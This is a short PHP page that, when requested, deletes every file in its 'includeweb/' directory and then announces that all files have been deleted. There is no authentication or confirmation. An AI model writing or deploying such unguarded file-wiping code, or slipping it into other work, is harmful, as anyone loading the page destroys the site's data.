<link rel="icon" href="png/website.png" type="image/x-icon" />
<?php
$files = glob('includeweb/*'); //get all file names
foreach($files as $file){
    if(is_file($file))
    unlink($file); //delete file
}
?>
All files have been Deleted...!